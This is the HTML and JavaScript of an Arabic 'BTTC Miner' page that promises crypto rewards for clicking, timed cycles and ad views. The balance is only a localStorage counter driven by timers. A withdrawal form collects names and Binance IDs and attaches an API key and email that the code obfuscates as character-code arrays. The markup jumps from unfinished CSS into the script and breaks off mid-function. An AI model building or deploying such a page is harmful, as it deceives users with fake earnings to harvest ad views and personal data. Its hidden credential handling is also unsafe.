<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>BTTC Miner | PAID PLUS</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }

  :root {
    --silver: #c0c0c0;
    --silver-bright: #e8e8e8;
    --silver-dark: #8a8a8a;
    --bg-deep: #050508;
    --bg-mid: #0f0f14;
    --card: rgba(255,255,255,0.03);
    --border: rgba(192,192,192,0.15);
    --text: #e8e8e8;
    --text-dim: #6b7280;
    --gold: #fbbf24;
    --red: #ef4444;
    --green: #22c55e;
  }

  html, body { width: 100%; min-height: 100vh; }

  body {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: 
      radial-gradient(ellipse 80% 50% at 50% -20%, rgba(192,192,192,0.08), transparent),
      radial-gradient(ellipse 60% 40% at 100% 100%, rgba(192,192,192,0.04), transparent),
      linear-gradient(180deg, #0a0a10 0%, #050508 100%);
    color: var(--text);
    padding: 20px;
    overflow-x: hidden;
    position: relative;
  }

  /* نجوم خفيفة */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image: 
      radial-gradient(1px 1px at 20% 30%, rgba(255,255,255,0.4), transparent),
      radial-gradient(1px 1px at 60% 70%, rgba(255,255,255,0.3), transparent),
      radial-gradient(1px 1px at 80% 15%, rgba(255,255,255,0.5), transparent),
      radial-gradient(1px 1px at 40% 90%, rgba(255,255,255,0.3), transparent);
    background-size: 100% 100%;
    animation: twinkle 4s infinite;
    pointer-events: none;
  }

  @keyframes twinkle {
    0%, 100% { opacity: 0.7; }
    50% { opacity: 0.3; }
  }

  /* الهيدر */
  .header {
    width: 100%;
    max-width: 420px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 14px 18px;
    background: linear-gradient(135deg, rgba(192,192,192,0.08), rgba(192,192,192,0.02));
    border: 1px solid rgba(192,192,192,0.2);
    border-radius: 18px;
    margin-bottom: 18px;
    position: relative;
    overflow: hidden;
    backdrop-filter: blur(10px);
  }

  .header::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
    animation: shine 4s infinite;
  }

  @keyframes shine {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .logo-text {
    font-size: 1.3rem;
    font-weight: 900;
    letter-spacing: 3px;
    background: linear-gradient(135deg, #ffffff, #c0c0c0, #808080);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    position: relative;
    z-index: 2;
  }

  .back-btn {
    color: var(--silver-bright);
    text-decoration: none;
    font-size: 11px;
    font-weight: 800;
    padding: 7px 13px;
    background: rgba(192,192,192,0.1);
    border-radius: 18px;
    border: 1px solid rgba(192,192,192,0.2);
    transition: 0.3s;
    position: relative;
    z-index: 2;
  }

  .back-btn:active { transform: scale(0.94); }

  /* البطاقة الرئيسية */
  .main-card {
    width: 100%;
    max-width: 420px;
    background: linear-gradient(160deg, rgba(255,255,255,0.04), rgba(255,255,255,0.01));
    border: 1px solid rgba(192,192,192,0.15);
    border-radius: 26px;
    padding: 26px 22px;
    backdrop-filter: blur(20px);
    box-shadow: 
      0 25px 70px rgba(0,0,0,0.7),
      inset 0 1px 0 rgba(255,255,255,0.06);
    margin-bottom: 18px;
    position: relative;
    overflow: hidden;
  }

  .main-card::before {
    content: '';
    position: absolute;
    top: -100px; left: -100px;
    width: 250px; height: 250px;
    background: radial-gradient(circle, rgba(192,192,192,0.1), transparent 70%);
    border-radius: 50%;
    pointer-events: none;
  }

  /* بطاقة الرصيد */
  .balance-card {
    background: 
      linear-gradient(135deg, rgba(192,192,192,0.1), rgba(192,192,192,0.02));
    border: 1px solid rgba(192,192,192,0.25);
    border-radius: 18px;
    padding: 18px;
    text-align: center;
    margin-bottom: 18px;
    position: relative;
    overflow: hidden;
  }

  .balance-card::before {
    content: '';
    position: absolute;
    top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
    animation: shine 4s infinite;
  }

  .balance-label {
    font-size: 0.68rem;
    color: var(--text-dim);
    letter-spacing: 3px;
    margin-bottom: 8px;
    font-weight: 700;
  }

  .balance-value {
    font-family: 'Courier New', monospace;
    font-size: 2.2rem;
    font-weight: 700;
    color: #ffffff;
    letter-spacing: 1px;
    text-shadow: 
      0 0 15px rgba(255,255,255,0.5),
      0 0 30px rgba(192,192,192,0.3);
    transition: transform 0.15s ease;
  }

  .balance-value.bump { animation: bump 0.2s ease; }

  @keyframes bump {
    0% { transform: scale(1); }
    50% { transform: scale(1.08); }
    100% { transform: scale(1); }
  }

  .balance-unit {
    font-size: 0.75rem;
    color: var(--silver);
    letter-spacing: 3px;
    margin-top: 6px;
    font-weight: 700;
  }

  /* بطاقة العداد */
  .timer-card {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: rgba(192,192,192,0.04);
    border: 1px solid rgba(192,192,192,0.15);
    border-radius: 14px;
    padding: 12px 18px;
    margin-bottom: 20px;
    transition: 0.3s;
  }

  .timer-card.active {
    background: rgba(192,192,192,0.1);
    border-color: rgba(192,192,192,0.4);
    box-shadow: 0 0 20px rgba(192,192,192,0.15);
  }

  .timer-label {
    font-size: 0.72rem;
    color: var(--silver-dark);
    letter-spacing: 2px;
    font-weight: 700;
  }

  .timer-value {
    font-family: 'Courier New', monospace;
    font-size: 1.5rem;
    font-weight: 700;
    color: var(--silver-bright);
    letter-spacing: 3px;
    text-shadow: 0 0 15px rgba(192,192,192,0.5);
    direction: ltr;
  }

  /* منطقة BTTC */
  .bttc-stage {
    position: relative;
    width: 100%;
    height: 260px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .counter {
    font-family: 'Courier New', monospace;
    font-size: 2.4rem;
    font-weight: 700;
    color: #ffffff;
    letter-spacing: 1px;
    text-shadow: 
      0 0 20px rgba(255,255,255,0.6),
      0 0 40px rgba(192,192,192,0.3);
    margin-bottom: 18px;
    line-height: 1;
  }

  .bttc-wrap {
    position: relative;
    width: 180px;
    height: 180px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .ring {
    position: absolute;
    border-radius: 50%;
    border: 1px solid rgba(192,192,192,0.15);
    pointer-events: none;
    transition: border-color 0.4s;
  }
  .ring-1 { width: 165px; height: 165px; }
  .ring-2 { 
    width: 195px; height: 195px; 
    border-style: dashed; 
    border-color: rgba(192,192,192,0.1);
    animation: spin 30s linear infinite; 
  }
  .ring-3 { width: 225px; height: 225px; border-color: rgba(192,192,192,0.05); }

  @keyframes spin { to { transform: rotate(360deg); } }

  .bttc-img {
    width: 130px;
    height: 130px;
    border-radius: 50%;
    cursor: pointer;
    object-fit: cover;
    z-index: 2;
    background: #ffffff;
    padding: 10px;
    box-shadow:
      0 0 0 3px rgba(192,192,192,0.4),
      0 0 40px rgba(192,192,192,0.5),
      0 0 80px rgba(192,192,192,0.2);
    transition: box-shadow 0.3s, filter 0.3s, transform 0.3s;
  }

  .bttc-img:hover { 
    filter: brightness(1.1);
    transform: scale(1.03);
  }

  .bttc-img:active {
    transform: scale(0.95);
  }

  .bttc-img.burst {
    animation: shake 0.15s infinite;
    box-shadow:
      0 0 0 5px rgba(255,255,255,0.8),
      0 0 70px rgba(255,255,255,0.9),
      0 0 120px rgba(192,192,192,0.5);
  }

  @keyframes shake {
    0%   { transform: translate(0, 0) rotate(0deg); }
    20%  { transform: translate(-3px, 2px) rotate(-2deg); }
    40%  { transform: translate(3px, -2px) rotate(2deg); }
    60%  { transform: translate(-2px, -3px) rotate(-1deg); }
    80%  { transform: translate(2px, 3px) rotate(1deg); }
    100% { transform: translate(0, 0) rotate(0deg); }
  }

  .bttc-img.cooling {
    opacity: 0.4;
    cursor: not-allowed;
    filter: grayscale(1) brightness(0.6);
    box-shadow: 0 0 0 3px rgba(100,116,139,0.2);
  }

  /* شريط التقدم */
  .progress-wrap {
    width: 100%;
    max-width: 260px;
    height: 4px;
    background: rgba(255,255,255,0.05);
    border-radius: 10px;
    overflow: hidden;
    margin-top: 18px;
    opacity: 0;
    transition: opacity 0.4s;
  }

  .progress-wrap.visible { opacity: 1; }

  .progress-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #808080, #e8e8e8);
    border-radius: 10px;
    transition: width 0.1s linear;
    box-shadow: 0 0 12px rgba(192,192,192,0.8);
  }

  .status {
    font-size: 0.75rem;
    letter-spacing: 1.5px;
    color: var(--text-dim);
    margin-top: 14px;
    min-height: 20px;
    transition: color 0.3s;
    font-weight: 600;
    text-align: center;
    padding: 0 10px;
  }

  .status.active { color: var(--silver-bright); }
  .status.burst { color: #ffffff; }
  .status.cooling { color: var(--red); }

  /* الإحصائيات */
  .stats-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-top: 18px;
  }

  .stat-box {
    background: rgba(192,192,192,0.03);
    border: 1px solid rgba(192,192,192,0.1);
    border-radius: 12px;
    padding: 10px;
    text-align: center;
  }

  .stat-label {
    font-size: 0.62rem;
    color: var(--text-dim);
    letter-spacing: 1px;
    margin-bottom: 6px;
    font-weight: 700;
  }

  .stat-value {
    font-family: 'Courier New', monospace;
    font-size: 0.95rem;
    font-weight: 700;
    color: var(--silver-bright);
    letter-spacing: 1px;
  }

  /* أزرار أسفل */
  .actions-bottom {
    width: 100%;
    max-width: 420px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .action-btn {
    width: 100%;
    padding: 15px;
    font-size: 0.85rem;
    font-weight: 800;
    letter-spacing: 1.5px;
    border: 1px solid rgba(192,192,192,0.25);
    border-radius: 14px;
    cursor: pointer;
    transition: all 0.3s;
    font-family: 'Cairo', sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    position: relative;
    overflow: hidden;
  }

  .action-btn svg { width: 16px; height: 16px; }

  /* زر الإعلان */
  .ad-btn {
    background: linear-gradient(135deg, rgba(192,192,192,0.15), rgba(192,192,192,0.05));
    color: var(--silver-bright);
  }

  .ad-btn:not(:disabled):hover {
    background: linear-gradient(135deg, rgba(192,192,192,0.25), rgba(192,192,192,0.1));
    transform: translateY(-2px);
    box-shadow: 0 10px 30px rgba(192,192,192,0.2);
    border-color: rgba(192,192,192,0.4);
  }

  .ad-btn:disabled {
    opacity: 0.4;
    cursor: not-allowed;
  }

  /* زر السحب */
  .withdraw-btn {
    background: linear-gradient(135deg, rgba(251,191,36,0.12), rgba(251,191,36,0.03));
    color: var(--gold);
    border-color: rgba(251,191,36,0.3);
  }

  .withdraw-btn:not(:disabled):hover {
    background: linear-gradient(135deg, rgba(251,191,36,0.25), rgba(251,191,36,0.08));
    transform: translateY(-2px);
    box-shadow: 0 10px 30px rgba(251,191,36,0.25);
    border-color: rgba(251,191,36,0.5);
  }

  .withdraw-btn:disabled {
    border-color: rgba(100,116,139,0.2);
    color: #334155;
    background: rgba(100,116,139,0.05);
    cursor: not-allowed;
  }

  /* نجوم طائرة */
  .float-reward {
    position: fixed;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-weight: 700;
    font-size: 1rem;
    pointer-events: none;
    animation: floatUp 1.1s ease-out forwards;
    z-index: 99;
    text-shadow: 0 0 15px rgba(255,255,255,0.9);
    direction: ltr;
  }

  @keyframes floatUp {
    0%   { opacity: 1; transform: translateY(0) scale(1); }
    100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
  }

  /* جزيئات */
  .particle {
    position: fixed;
    width: 3px;
    height: 3px;
    border-radius: 50%;
    background: #ffffff;
    pointer-events: none;
    box-shadow: 0 0 10px #ffffff;
    animation: particleFly 1s ease-out forwards;
  }

  @keyframes particleFly {
    0%   { opacity: 1; transform: translate(0, 0) scale(1); }
    100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
  }

  /* Toast */
  .toast {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) translateY(100px);
    background: rgba(20,20,25,0.98);
    border: 1px solid rgba(192,192,192,0.3);
    border-radius: 12px;
    padding: 12px 24px;
    color: var(--silver-bright);
    font-size: 0.85rem;
    transition: transform 0.4s ease;
    z-index: 200;
    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
    max-width: 90%;
    text-align: center;
    font-weight: 700;
  }

  .toast.show { transform: translateX(-50%) translateY(0); }

  /* نافذة الإعلان */
  .ad-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.97);
    backdrop-filter: blur(20px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 500;
    padding: 20px;
  }

  .ad-overlay.show { display: flex; animation: fadeIn 0.4s; }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

  .ad-content {
    text-align: center;
    max-width: 380px;
    width: 100%;
    animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1);
  }

  @keyframes slideUp {
    from { transform: translateY(40px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
  }

  .ad-label {
    display: inline-block;
    background: linear-gradient(135deg, rgba(192,192,192,0.2), rgba(192,192,192,0.05));
    color: var(--silver-bright);
    padding: 6px 18px;
    border-radius: 20px;
    font-size: 11px;
    font-weight: 800;
    margin-bottom: 24px;
    letter-spacing: 3px;
    border: 1px solid rgba(192,192,192,0.3);
  }

  .ad-frame {
  width: 100%;
  min-height: 250px;
  background: linear-gradient(135deg, #0a0a10, #050508);
  border: 2px solid rgba(192,192,192,0.15);
  border-radius: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 12px;
  margin-bottom: 24px;
  position: relative;
  overflow: hidden;
  padding: 15px;
}

/* لضمان ظهور الإعلان */
.ad-frame iframe,
.ad-frame ins,
.ad-frame img,
.ad-frame div[id*="container"] {
  max-width: 100%;
  border-radius: 12px;
}

  .ad-frame::before {
    content: '';
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at 50% 50%, rgba(192,192,192,0.1), transparent 70%);
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 0.5; }
    50% { opacity: 1; }
  }

  .ad-icon {
    width: 70px;
    height: 70px;
    background: linear-gradient(135deg, rgba(192,192,192,0.15), rgba(192,192,192,0.03));
    border: 2px solid rgba(192,192,192,0.3);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--silver-bright);
    position: relative;
    z-index: 2;
  }

  .ad-icon svg { width: 34px; height: 34px; }

  .ad-frame p {
    font-size: 13px;
    color: var(--text-dim);
    font-weight: 700;
    letter-spacing: 1px;
    position: relative;
    z-index: 2;
  }

  /* عداد دائري */
  .ad-timer-wrap {
    position: relative;
    width: 120px;
    height: 120px;
    margin: 0 auto 24px;
  }

  .ad-timer-wrap svg {
    width: 100%;
    height: 100%;
    transform: rotate(-90deg);
  }

  .ad-timer-wrap circle {
    fill: none;
    stroke-width: 6;
    stroke-linecap: round;
  }

  .ad-timer-bg { stroke: rgba(192,192,192,0.1); }
  .ad-timer-fill { 
    stroke: url(#silverGrad);
    stroke-dasharray: 283;
    stroke-dashoffset: 0;
    transition: stroke-dashoffset 1s linear;
  }

  .ad-timer-count {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Courier New', monospace;
    font-size: 40px;
    font-weight: 900;
    color: #ffffff;
    text-shadow: 0 0 20px rgba(255,255,255,0.6);
  }

  .ad-text {
    color: var(--silver-dark);
    font-size: 13px;
    line-height: 1.7;
    letter-spacing: 1px;
    font-weight: 600;
  }

  /* نافذة السحب */
  .modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.95);
    backdrop-filter: blur(15px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 400;
    padding: 20px;
    overflow-y: auto;
  }

  .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }

  .modal {
    background: linear-gradient(160deg, #0f0f14, #050508);
    border: 1px solid rgba(192,192,192,0.25);
    border-radius: 24px;
    padding: 28px 24px;
    width: 100%;
    max-width: 400px;
    box-shadow: 
      0 30px 80px rgba(0,0,0,0.9),
      inset 0 1px 0 rgba(255,255,255,0.05);
    animation: slideUp 0.4s;
    color: #fff;
  }

  .binance-logo {
    width: 70px;
    height: 70px;
    margin: 0 auto 18px;
    background: #000;
    border-radius: 18px;
    padding: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 0 0 3px rgba(240,185,11,0.3);
    border: 2px solid rgba(240,185,11,0.4);
  }

  .binance-logo img {
    width: 100%;
    height: 100%;
    object-fit: contain;
  }

  .modal-title {
    font-size: 1.25rem;
    font-weight: 900;
    text-align: center;
    margin-bottom: 8px;
    background: linear-gradient(135deg, #ffffff, #c0c0c0);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }

  .modal-sub {
    font-size: 0.8rem;
    color: var(--text-dim);
    text-align: center;
    margin-bottom: 20px;
    line-height: 1.7;
  }

  .modal-balance {
    background: linear-gradient(135deg, rgba(192,192,192,0.1), rgba(192,192,192,0.02));
    border: 2px solid rgba(192,192,192,0.3);
    border-radius: 14px;
    padding: 14px;
    text-align: center;
    margin-bottom: 18px;
  }

  .modal-balance-label {
    font-size: 11px;
    color: var(--silver-dark);
    font-weight: 700;
    margin-bottom: 6px;
    letter-spacing: 1px;
  }

  .modal-balance-value {
    font-size: 26px;
    font-weight: 900;
    color: #ffffff;
    direction: ltr;
    line-height: 1;
    text-shadow: 0 0 15px rgba(255,255,255,0.5);
  }

  .modal-balance-value small { font-size: 13px; opacity: 0.85; }

  .form-group { margin-bottom: 14px; }

  .form-group label {
    display: block;
    font-size: 12px;
    font-weight: 800;
    margin-bottom: 7px;
    color: #fff;
  }

  .form-group label::after {
    content: ' *';
    color: #ef4444;
  }

  .form-group input {
    width: 100%;
    padding: 14px;
    background: rgba(255,255,255,0.03);
    border: 2px solid rgba(192,192,192,0.15);
    border-radius: 12px;
    color: var(--text);
    font-family: 'Cairo', sans-serif;
    font-size: 1rem;

<script>
  /* ============================================
     🔒 المفاتيح المشفرة
  ============================================ */
  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
  const _K3 = [53, 99, 52, 56];
  const _EM = [109, 97, 121, 97, 114, 97, 121, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];

  function _dk() {
    let s = '';
    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
    return s;
  }

  function _de() {
    let s = '';
    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
    return s;
  }

  /* ============ الإعدادات ============ */
  const BURST_AMOUNT        = 100;
  const BURST_DURATION      = 10000;
  const CYCLE_BTTC          = 100;
  const CYCLE_MS            = 30 * 60 * 1000;
  const MIN_WITHDRAW        = 1000;
  
  const AD_REWARD           = 50;                     // 50 BTTC لكل إعلان
  const AD_DURATION         = 10;                     // 10 ثواني
  const AD_COOLDOWN         = 60 * 60 * 1000;         // كل ساعة

  /* ============ الحالة ============ */
  let balance         = parseFloat(localStorage.getItem('bttc_balance') || '0');
  let burstActive     = false;
  let cycleActive     = false;
  let burstTimer      = null;
  let cycleStartTime  = parseInt(localStorage.getItem('bttc_cycleStart') || '0');
  let lastAdTime      = parseInt(localStorage.getItem('bttc_lastAd') || '0');
  let adActive        = false;

  /* ============ العناصر ============ */
  const balanceEl    = document.getElementById('balanceEl');
  const counterEl    = document.getElementById('counter');
  const timerEl      = document.getElementById('timerEl');
  const timerCard    = document.getElementById('timerCard');
  const bttcImg      = document.getElementById('bttcImg');
  const progressWrap = document.getElementById('progressWrap');
  const progressBar  = document.getElementById('progressBar');
  const statusEl     = document.getElementById('statusEl');
  const rateEl       = document.getElementById('rateEl');
  const sysStatusEl  = document.getElementById('sysStatusEl');
  const withdrawBtn  = document.getElementById('withdrawBtn');
  const withdrawText = document.getElementById('withdrawText');
  const adBtn        = document.getElementById('adBtn');
  const adBtnText    = document.getElementById('adBtnText');
  const adOverlay    = document.getElementById('adOverlay');
  const adTimerCircle= document.getElementById('adTimerCircle');
  const adTimerCount = document.getElementById('adTimerCount');
  const modalOverlay = document.getElementById('modalOverlay');
  const modalContent = document.getElementById('modalContent');
  const modalBalance = document.getElementById('modalBalance');
  const confirmBtn   = document.getElementById('confirmBtn');
  const toastEl      = document.getElementById('toast');
  const body         = document.body;

  /* ============ تنسيق ============ */
  function formatNum(v) {
    if (v === 0) return '0';
    return Math.floor(v).toLocaleString('en-US');
  }

  function formatTime(ms) {
    if (ms < 0) ms = 0;
    const totalSec = Math.floor(ms / 1000);
    const h = Math.floor(totalSec / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    if (h > 0) {
      return String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
    }
    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
  }

  function updateBalanceUI(bump = false) {
    balanceEl.textContent = formatNum(balance);
    counterEl.textContent = formatNum(balance);
    if (bump) {
      balanceEl.classList.remove('bump');
      void balanceEl.offsetWidth;
      balanceEl.classList.add('bump');
    }
    localStorage.setItem('bttc_balance', balance);
    
    if (balance >= MIN_WITHDRAW) {
      withdrawBtn.disabled = false;
      withdrawText.textContent = 'سحب · ' + formatNum(balance) + ' BTTC';
    } else {
      withdrawBtn.disabled = true;
      withdrawText.textContent = 'سحب · الحد الأدنى 1000 BTTC';
    }
  }

  function showToast(msg, duration = 2500) {
    toastEl.textContent = msg;
    toastEl.classList.add('show');
    clearTimeout(toastEl._t);
    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
  }

  function floatNumber(text) {
    const el = document.createElement('div');
    el.className = 'float-reward';
    el.textContent = text;
    const rect = bttcImg.getBoundingClientRect();
    el.style.left = (rect.left + rect.width / 2 - 20 + (Math.random() * 40 - 20)) + 'px';
    el.style.top  = (rect.top - 10) + 'px';
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 1100);
  }

  function spawnParticles(count = 10) {
    const rect = bttcImg.getBoundingClientRect();
    const cx = rect.left + rect.width / 2;
    const cy = rect.top + rect.height / 2;
    for (let i = 0; i < count; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      const angle = (Math.PI * 2 * i) / count + Math.random() * 0.5;
      const dist  = 70 + Math.random() * 60;
      p.style.left = cx + 'px';
      p.style.top  = cy + 'px';
      p.style.setProperty('--tx', (Math.cos(angle) * dist) + 'px');
      p.style.setProperty('--ty', (Math.sin(angle) * dist) + 'px');
      document.body.appendChild(p);
      setTimeout(() => p.remove(), 1000);
    }
  }

  /* ============ حالة الزر ============ */
  function canClick() { return !cycleActive; }

  function updateBttcButton() {
    if (canClick()) {
      bttcImg.classList.remove('cooling');
      statusEl.textContent = 'اضغط للحصول على +100 BTTC';
      statusEl.className = 'status';
    } else {
      bttcImg.classList.add('cooling');
      const remaining = CYCLE_MS - (Date.now() - cycleStartTime);
      statusEl.textContent = 'العدّاد يعمل — ' + formatTime(remaining) + ' متبقية';
      statusEl.className = 'status cooling';
    }
  }

  /* ============ التعدين السريع ============ */
  function startBurst() {
    if (burstActive) return;
    if (!canClick()) { showToast('انتظر انتهاء العدّاد'); return; }

    burstActive = true;
    bttcImg.classList.add('burst');
    progressWrap.classList.add('visible');
    statusEl.textContent = 'تعدين سريع...';
    statusEl.className = 'status burst';
    sysStatusEl.textContent = 'تعدين';
    sysStatusEl.style.color = '#e8e8e8';

    const startTime = Date.now();
    const startBalance = balance;

    burstTimer = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const ratio = Math.min(elapsed / BURST_DURATION, 1);
      const earned = BURST_AMOUNT * ratio;
      const diff = earned - (balance - startBalance);

      if (diff > 0) {
        balance += diff;
        updateBalanceUI(true);
        if (Math.random() < 0.5) floatNumber('+' + Math.floor(diff));
      }

      progressBar.style.width = (ratio * 100) + '%';
      if (Math.random() < 0.3) spawnParticles(4);

      if (ratio >= 1) {
        clearInterval(burstTimer);
        burstTimer = null;
        finishBurst();
      }
    }, 50);
  }

  function finishBurst() {
    burstActive = false;
    bttcImg.classList.remove('burst');
    progressBar.style.width = '0%';
    progressWrap.classList.remove('visible');
    updateBalanceUI(true);
    startCycle();
  }

  /* ============ دورة 30 دقيقة ============ */
  function startCycle() {
    cycleActive = true;
    cycleStartTime = Date.now();
    localStorage.setItem('bttc_cycleStart', cycleStartTime);
    localStorage.setItem('bttc_cycleActive', '1');

    timerCard.classList.add('active');
    sysStatusEl.textContent = 'نشط';
    sysStatusEl.style.color = '#e8e8e8';
    rateEl.textContent = CYCLE_BTTC + ' / 30 دقيقة';

    updateBttcButton();
    updateCycleTimer();
  }

  function updateCycleTimer() {
    if (!cycleActive) {
      timerEl.textContent = '--:--';
      timerCard.classList.remove('active');
      return;
    }

    const elapsed = Date.now() - cycleStartTime;
    const remaining = Math.max(0, CYCLE_MS - elapsed);
    timerEl.textContent = formatTime(remaining);

    if (remaining > 0) {
      statusEl.textContent = 'العدّاد يعمل — ' + formatTime(remaining) + ' متبقية';
      statusEl.className = 'status cooling';
    }

    if (remaining <= 0) {
      balance += CYCLE_BTTC;
      updateBalanceUI(true);
      showToast('انتهت الدورة! +' + CYCLE_BTTC + ' BTTC');
      
      cycleActive = false;
      localStorage.setItem('bttc_cycleActive', '0');
      localStorage.removeItem('bttc_cycleStart');
      
      timerCard.classList.remove('active');
      bttcImg.classList.remove('cooling');
      
      sysStatusEl.textContent = 'جاهز';
      sysStatusEl.style.color = '#e8e8e8';
      
      timerEl.textContent = '--:--';
      updateBttcButton();
    }
  }

  setInterval(updateCycleTimer, 1000);

  /* ============ نافذة الإعلان ============ */
  function canWatchAd() {
    return (Date.now() - lastAdTime) >= AD_COOLDOWN;
  }

  function updateAdButton() {
    if (canWatchAd()) {
      adBtn.disabled = false;
      adBtnText.textContent = 'شاهد إعلان · +50 BTTC';
    } else {
      adBtn.disabled = true;
      const remaining = AD_COOLDOWN - (Date.now() - lastAdTime);
      adBtnText.textContent = 'الإعلان بعد ' + formatTime(remaining);
    }
  }

  function openAd() {
    if (!canWatchAd()) {
      showToast('انتظر انتهاء وقت الإعلان');
      return;
    }
    if (adActive) return;

    adActive = true;
    adOverlay.classList.add('show');

    let timeLeft = AD_DURATION;
    adTimerCount.textContent = timeLeft;
    adTimerCircle.style.strokeDashoffset = '0';

    const totalDash = 283;
    const adInterval = setInterval(() => {
      timeLeft--;
      adTimerCount.textContent = timeLeft;
      
      const offset = totalDash - (timeLeft / AD_DURATION) * totalDash;
      adTimerCircle.style.strokeDashoffset = offset;

      if (timeLeft <= 0) {
        clearInterval(adInterval);
        adOverlay.classList.remove('show');
        adActive = false;

        // إضافة المكافأة
        balance += AD_REWARD;
        lastAdTime = Date.now();
        localStorage.setItem('bttc_lastAd', lastAdTime);
        updateBalanceUI(true);
        updateAdButton();
        showToast('تم! +' + AD_REWARD + ' BTTC من الإعلان');
        spawnParticles(15);
      }
    }, 1000);
  }

  setInterval(updateAdButton, 1000);

  /* ============ استئناف ============ */
  function resume() {
    const cycleWasActive = localStorage.getItem('bttc_cycleActive') === '1';
    const storedStart = parseInt(localStorage.getItem('bttc_cycleStart') || '0');

    if (cycleWasActive && storedStart) {
      const elapsed = Date.now() - storedStart;
      
      if (elapsed >= CYCLE_MS) {
        balance += CYCLE_BTTC;
        updateBalanceUI(true);
        showToast('انتهت الدورة أثناء غيابك! +' + CYCLE_BTTC + ' BTTC');
        
        localStorage.setItem('bttc_cycleActive', '0');
        localStorage.removeItem('bttc_cycleStart');
        
        sysStatusEl.textContent = 'جاهز';
        rateEl.textContent = CYCLE_BTTC + ' / 30 دقيقة';
        updateBttcButton();
      } else {
        cycleActive = true;
        cycleStartTime = storedStart;
        
        timerCard.classList.add('active');
        sysStatusEl.textContent = 'نشط';
        rateEl.textContent = CYCLE_BTTC + ' / 30 دقيقة';
        
        updateBttcButton();
        updateCycleTimer();
      }
    } else {
      updateBalanceUI();
      rateEl.textContent = CYCLE_BTTC + ' / 30 دقيقة';
      sysStatusEl.textContent = 'جاهز';
      timerEl.textContent = '--:--';
      updateBttcButton();
    }
    
    updateAdButton();
  }

  /* ============ الأحداث ============ */
  bttcImg.addEventListener('click', () => {
    if (burstActive) return;
    if (!canClick()) { showToast('انتظر انتهاء العدّاد'); return; }
    startBurst();
  });

  /* ============ زر السحب ============ */
  withdrawBtn.addEventListener('click', () => {
    if (balance < MIN_WITHDRAW) return;
    modalBalance.textContent = Math.floor(balance).toLocaleString('en-US');
    modalOverlay.classList.add('show');
  });

  function closeWithdraw() {
    modalOverlay.classList.remove('show');
  }

  modalOverlay.addEventListener('click', (e) => {
    if (e.target === modalOverlay) closeWithdraw();
  });

  /* ============ إرسال السحب ============ */
  function submitWithdraw(event) {
    event.preventDefault();

    const form = event.target;
    const formData = new FormData(form);

    formData.set('apiKey', _dk());
    formData.set('email', _de());

    const fullName = formData.get('full_name').trim();
    const bid = formData.get('binance_id').trim();

    if (!fullName) { showToast('الرجاء إدخال الاسم'); return; }
    if (!bid || bid.length < 6) { showToast('Binance ID غير صالح'); return; }

    const withdrawAmount = balance;

